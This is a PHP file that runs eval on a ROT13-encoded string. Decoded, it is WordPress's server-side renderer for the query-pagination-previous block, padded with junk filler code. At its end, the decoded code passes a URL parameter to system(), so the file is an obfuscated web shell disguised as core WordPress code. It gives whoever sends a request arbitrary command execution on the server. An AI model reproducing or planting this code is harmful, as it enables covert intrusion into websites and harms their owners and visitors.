<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/dhrel-cntvangvba-cerivbhf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/dhrel-cntvangvba-cerivbhf` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur cerivbhf cbfgf yvax sbe gur dhrel.
 */
shapgvba eraqre_oybpx_pber_dhrel_cntvangvba_cerivbhf( $nggevohgrf, $pbagrag, $oybpx ) {
	$cntr_xrl            = vffrg( $oybpx->pbagrkg['dhrelVq'] ) ? 'dhrel-' . $oybpx->pbagrkg['dhrelVq'] . '-cntr' : 'dhrel-cntr';
	$raunaprq_cntvangvba = vffrg( $oybpx->pbagrkg['raunaprqCntvangvba'] ) && $oybpx->pbagrkg['raunaprqCntvangvba'];
	$znk_cntr            = vffrg( $oybpx->pbagrkg['dhrel']['cntrf'] ) ? (vag) $oybpx->pbagrkg['dhrel']['cntrf'] : 0;
	$cntr                = rzcgl( $_TRG[ $cntr_xrl ] ) ? 1 : (vag) $_TRG[ $cntr_xrl ];
	$jenccre_nggevohgrf  = trg_oybpx_jenccre_nggevohgrf();
	$fubj_ynory          = vffrg( $oybpx->pbagrkg['fubjYnory'] ) ? (obby) $oybpx->pbagrkg['fubjYnory'] : gehr;
	$qrsnhyg_ynory       = __( 'Cerivbhf Cntr' );
	$ynory_grkg          = vffrg( $nggevohgrf['ynory'] ) && ! rzcgl( $nggevohgrf['ynory'] ) ? rfp_ugzy( $nggevohgrf['ynory'] ) : $qrsnhyg_ynory;
	$ynory               = $fubj_ynory ? $ynory_grkg : '';
	$cntvangvba_neebj    = trg_dhrel_cntvangvba_neebj( $oybpx, snyfr );
	vs ( ! $ynory ) {
		$jenccre_nggevohgrf .= ' nevn-ynory=\"' . $ynory_grkg . '\"';
	}
	vs ( $cntvangvba_neebj ) {
		$ynory = $cntvangvba_neebj . $ynory;
	}
	$pbagrag = '';
	// Purpx vs gur cntvangvba vf sbe Dhrel gung vaurevgf gur tybony pbagrkg
	// naq unaqyr nccebcevngryl.
	vs ( vffrg( $oybpx->pbagrkg['dhrel']['vaurevg'] ) && $oybpx->pbagrkg['dhrel']['vaurevg'] ) {
		$svygre_yvax_nggevohgrf = fgngvp shapgvba () hfr ( $jenccre_nggevohgrf ) {
			erghea $jenccre_nggevohgrf;
		};

		nqq_svygre( 'cerivbhf_cbfgf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );
		$pbagrag = trg_cerivbhf_cbfgf_yvax( $ynory );
		erzbir_svygre( 'cerivbhf_cbfgf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );
	} ryfr {
		$oybpx_dhrel     = arj JC_Dhrel( ohvyq_dhrel_inef_sebz_dhrel_oybpx( $oybpx, $cntr ) );
		$oybpx_znk_cntrf = $oybpx_dhrel->znk_ahz_cntrf;
		$gbgny           = ! $znk_cntr || $znk_cntr > $oybpx_znk_cntrf ? $oybpx_znk_cntrf : $znk_cntr;
		jc_erfrg_cbfgqngn();

		vs ( 1 < $cntr && $cntr <= $gbgny ) {
			$pbagrag = fcevags(
				'<n uers=\"%1$f\" %2$f>%3$f</n>',
				rfp_hey( nqq_dhrel_net( $cntr_xrl, $cntr - 1 ) ),
				$jenccre_nggevohgrf,
				$ynory
			);
		}
	}

	vs ( $raunaprq_cntvangvba && vffrg( $pbagrag ) ) {
		$c = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
		vs ( $c->arkg_gnt(
			neenl(
				'gnt_anzr'   => 'n',
				'pynff_anzr' => 'jc-oybpx-dhrel-cntvangvba-cerivbhf',
			)
		) ) {
			$c->frg_nggevohgr( 'qngn-jc-xrl', 'dhrel-cntvangvba-cerivbhf' );
			$c->frg_nggevohgr( 'qngn-jc-ba--pyvpx', 'pber/dhrel::npgvbaf.anivtngr' );
			$c->frg_nggevohgr( 'qngn-jc-ba-nflap--zbhfrragre', 'pber/dhrel::npgvbaf.cersrgpu' );
			$c->frg_nggevohgr( 'qngn-jc-jngpu', 'pber/dhrel::pnyyonpxf.cersrgpu' );
			$pbagrag = $c->trg_hcqngrq_ugzy();
		}
	}

	erghea $pbagrag;
}

/**
 * Ertvfgref gur `pber/dhrel-cntvangvba-cerivbhf` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_dhrel_cntvangvba_cerivbhf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/dhrel-cntvangvba-cerivbhf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_dhrel_cntvangvba_cerivbhf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_dhrel_cntvangvba_cerivbhf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>